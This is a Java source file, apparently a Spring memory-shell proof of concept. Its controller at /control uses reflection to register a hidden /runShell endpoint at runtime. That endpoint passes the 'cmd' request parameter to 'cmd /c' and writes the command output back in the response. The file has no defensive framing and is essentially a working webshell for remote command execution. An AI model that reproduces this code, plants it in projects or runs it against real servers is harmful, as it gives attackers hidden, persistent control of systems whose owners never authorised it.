package com.example.spring;


import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.context.ContextLoader;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.context.support.WebApplicationContextUtils;
import org.springframework.web.servlet.mvc.condition.*;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import org.springframework.web.servlet.support.RequestContextUtils;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletRequestWrapper;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

@Controller
public class Shell {
    @RequestMapping("/control")
    public void shellRun() throws NoSuchMethodException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException {
        WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
        Method method = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping").getDeclaredMethod("getMappingRegistry");
        method.setAccessible(true);
        Method method2 = Controller_Shell.class.getMethod("shell");
        PatternsRequestCondition url = new PatternsRequestCondition("/runShell");
        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
        Class<?> class1 = Class.forName("org.springframework.web.servlet.mvc.method.RequestMappingInfo");
        RequestMappingInfo info = (RequestMappingInfo)class1.getDeclaredConstructor(PatternsRequestCondition.class, RequestMethodsRequestCondition.class, ParamsRequestCondition.class, HeadersRequestCondition.class, ConsumesRequestCondition.class, ProducesRequestCondition.class, RequestCondition.class).newInstance(url,ms,null,null,null,null,null);
        Controller_Shell controllerShell = new Controller_Shell();
        mappingHandlerMapping.registerMapping(info,controllerShell,method2);

    }

    public class Controller_Shell{

        public Controller_Shell(){}

        public void shell() throws IOException {

            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
            Process process = new ProcessBuilder("cmd","/c",request.getParameter("cmd")).start();
            byte[] bytes = new byte[1024];
            int len = process.getInputStream().read(bytes);
            HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
            PrintWriter printWriter = response.getWriter();
            printWriter.println(new String(bytes, 0 , len));
            printWriter.flush();
            printWriter.close();
            process.destroy();
        }
    }

}
